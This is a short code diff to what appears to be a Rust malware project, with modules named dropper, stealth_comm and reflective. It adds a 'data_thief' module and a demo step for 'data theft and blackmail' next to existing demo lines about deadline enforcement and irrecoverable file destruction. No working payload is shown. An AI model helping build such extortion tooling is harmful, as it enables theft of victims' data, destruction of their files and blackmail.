@@ -10,6 +10,7 @@ mod reflective;
 mod stealth_comm;
 mod dropper;
 mod config;
+mod data_thief;
 #[cfg(feature = "web")]
 mod web;
 
@@ -190,6 +191,10 @@ fn run_demo_mode() {
     println!("   • Deadline enforcement");
     println!("   • Recursive file destruction");
     println!("   • Irrecoverable deletion");
+
+    // 9. Show data theft and blackmail
+    println!("\n9️⃣ 🕵️ DATA THEFT & BLACKMAIL:");
+    data_thief::demo_data_theft();
 
     println!("\n🎉 Demo completed successfully!");
     println!("💡 This demo shows all capabilities without any risk.");
